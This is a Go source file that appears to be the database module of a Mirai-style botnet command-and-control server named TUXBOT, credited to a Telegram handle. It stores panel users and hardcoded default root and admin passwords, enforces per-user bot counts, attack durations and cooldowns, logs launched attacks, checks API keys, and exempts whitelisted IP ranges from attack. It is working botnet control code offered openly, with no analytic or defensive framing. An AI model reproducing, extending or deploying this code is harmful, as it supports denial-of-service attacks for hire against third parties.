// by juan @ipmiv2 on telegram
package main

import (
    "database/sql"
    "fmt"
    "net"
    "os"
    "encoding/binary"
    "time"
    _ "github.com/mattn/go-sqlite3"
    "errors"
)

type Database struct {
    db      *sql.DB
}

type AccountInfo struct {
    username    string
    maxBots     int
    admin       int
    maxDuration int
    cooldown    int
}

func NewDatabase(dbPath string) *Database {
    db, err := sql.Open("sqlite3", dbPath)
    if err != nil {
        fmt.Println(err)
        return nil
    }
    db.SetMaxOpenConns(1)

    seedUser := os.Getenv("TUXBOT_USER")
    seedPass := os.Getenv("TUXBOT_PASS")
    if seedUser == "" {
        seedUser = "root"
    }
    if seedPass == "" {
        seedPass = "mi3k02006"
    }

    schema := fmt.Sprintf(`
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL UNIQUE,
        password TEXT NOT NULL,
        duration_limit INTEGER,
        cooldown INTEGER NOT NULL DEFAULT 0,
        max_bots INTEGER DEFAULT -1,
        admin INTEGER DEFAULT 0,
        api_key TEXT
    );
    CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        time_sent INTEGER NOT NULL,
        duration INTEGER NOT NULL,
        command TEXT NOT NULL,
        max_bots INTEGER DEFAULT -1
    );
    CREATE TABLE IF NOT EXISTS whitelist (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        prefix TEXT,
        netmask INTEGER
    );
    INSERT OR IGNORE INTO users (username, password, duration_limit, cooldown, max_bots, admin) VALUES ('%s', '%s', 0, 0, -1, 1);
    INSERT OR IGNORE INTO users (username, password, duration_limit, cooldown, max_bots, admin) VALUES ('admin', '%s', 0, 0, -1, 1);
    `, seedUser, seedPass, seedPass)
    if _, err := db.Exec(schema); err != nil {
        fmt.Println("Schema error:", err)
    }

    fmt.Println("Database initialized")
    return &Database{db}
}

func now() string {
    return fmt.Sprintf("%d", time.Now().Unix())
}

func (this *Database) fetchRunningAttacks() int {
    var count int
    row := this.db.QueryRow("SELECT COUNT(*) FROM history WHERE (time_sent + duration) > " + now())
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }
    return count
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, admin, duration_limit, cooldown FROM users WHERE username = ? AND password = ?", username, password)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0, 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0, 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin, &accInfo.maxDuration, &accInfo.cooldown)
    return true, accInfo
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
    row := this.db.QueryRow("SELECT username FROM users WHERE username = ?", username)
    var existing string
    if row.Scan(&existing) == nil {
        return false
    }
    _, err := this.db.Exec("INSERT INTO users (username, password, max_bots, admin, cooldown, duration_limit) VALUES (?, ?, ?, 0, ?, ?)", username, password, max_bots, cooldown, duration)
    return err == nil
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
    rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
    if err != nil {
        fmt.Println(err)
        return false
    }
    defer rows.Close()
    for rows.Next() {
        var prefix string
        var netmask uint8
        rows.Scan(&prefix, &netmask)

        ip := net.ParseIP(prefix)
        if ip == nil {
            continue
        }
        ip = ip[12:]
        iWhitelistPrefix := binary.BigEndian.Uint32(ip)

        for aPNetworkOrder, aN := range attack.Targets {
            rvBuf := make([]byte, 4)
            binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
            iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
            if aN > netmask {
                if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                    return true
                }
            } else if aN < netmask {
                if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
                    return true
                }
            } else {
                if (iWhitelistPrefix == iAttackPrefix) {
                    return true
                }
            }
        }
    }
    return false
}

func (this *Database) RemoveUser(username string) bool {
    result, err := this.db.Exec("DELETE FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    affected, _ := result.RowsAffected()
    return affected > 0
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
    var userId, durationLimit, admin, cooldown uint32
    row := this.db.QueryRow("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
    err := row.Scan(&userId, &durationLimit, &admin, &cooldown)
    if err != nil {
        return false, errors.New("Your access has been terminated")
    }

    if durationLimit != 0 && duration > durationLimit {
        return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
    }

    if admin == 0 {
        var timeSent, historyDuration uint32
        row = this.db.QueryRow("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > "+now(), userId, cooldown)
        if row.Scan(&timeSent, &historyDuration) == nil {
            return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
        }
    }

    _, err = this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, "+now()+", ?, ?, ?)", userId, duration, fullCommand, maxBots)
    if err != nil {
        fmt.Println("Attack INSERT error:", err)
    }
    return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, admin, duration_limit, cooldown FROM users WHERE api_key = ?", apikey)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0, 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0, 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin, &accInfo.maxDuration, &accInfo.cooldown)
    return true, accInfo
}
